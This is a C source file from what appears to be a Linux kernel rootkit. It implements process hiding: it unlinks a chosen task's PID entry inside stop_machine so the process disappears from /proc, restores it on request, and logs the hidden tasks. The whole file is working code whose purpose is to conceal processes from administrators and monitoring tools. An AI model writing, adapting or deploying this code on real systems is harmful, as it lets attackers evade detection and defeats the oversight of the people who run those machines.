#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/pid.h>
#include <linux/stop_machine.h>
#include "kernel_addr.h"
#include "fs.h"

struct hidden_tasks_node {
    struct task_struct *task;
    struct fs_file_node *fnode;
    struct list_head list;
};
static LIST_HEAD(hidden_tasks_node);

static struct task_struct *
_check_hide_by_pid(pid_t pid)
{
    struct hidden_tasks_node *node;
    list_for_each_entry(node, &hidden_tasks_node, list)
    {
        if(pid == node->task->pid)
            return node->task;
    }
    return NULL; /**< error */
}

static inline int _hide_task(void *data) {
    struct task_struct *task;
    struct hidden_tasks_node *node;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
    struct hlist_node *link;
#else
    struct pid_link *link;
#endif

    if(!data)
        return 0;

    task = (struct task_struct *)data;

    // add task into our list
    node = kcalloc(1, sizeof(struct hidden_tasks_node) , GFP_KERNEL);
    if(!node)
        return 0;

    node->task = task;
    node->fnode = fs_get_file_node(task);
    list_add_tail(&node->list, &hidden_tasks_node);

    /* task vanishes from /proc */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
    link = &task->pid_links[PIDTYPE_PID];
#else
    link = &task->pids[PIDTYPE_PID];
#endif
    if(!link)
        return 0;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
    hlist_del(link);
#else
    hlist_del(&link->node);
#endif
    /* list_del_init(&task->sibling); */

    return 1;
}

static inline int _unhide_task(void *data) {
   struct hidden_tasks_node *node, *next;
   struct task_struct *task;;

   if(!data)
     return 0;

   task = (struct task_struct *)data;
   list_for_each_entry_safe(node, next, &hidden_tasks_node, list)
   {
       if(task == node->task) {
           list_del(&node->list);
           if(node->fnode) /* can be NULL */
               kfree(node->fnode);
           kfree(node);
           break;
       }
   }

   // restore task into system
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0)
   k_attach_pid(task, PIDTYPE_PID, task_pid(task));
#else
   k_attach_pid(task, PIDTYPE_PID);
#endif
   return 1;
}

void hide_task_by_pid(pid_t pid) {
    struct task_struct *task = _check_hide_by_pid(pid);
    if(task)
        stop_machine(_unhide_task, task, NULL);
    else {
        task = get_pid_task(find_get_pid(pid), PIDTYPE_PID);
        if(!task)
            return;
        stop_machine(_hide_task, task, NULL);
    }
}

void
wally_data_cleanup(void) {
    struct hidden_tasks_node *node, *next;
    list_for_each_entry_safe(node, next, &hidden_tasks_node, list)
    {
        stop_machine(_unhide_task, node->task, NULL);
    }
}

void wally_list_saved_tasks(void) {
    struct hidden_tasks_node *node;
    list_for_each_entry(node, &hidden_tasks_node, list)
    {
        /* to help grep */
        if(node->fnode)
            printk(KERN_INFO "executable:%s|inode:%llu|task:%p|pid:%d\n",
                    node->fnode->filename, node->fnode->ino, node->task, node->task->pid);
        else
            printk(KERN_INFO "task:%p|pid:%d\n", node->task, node->task->pid);
    }
}
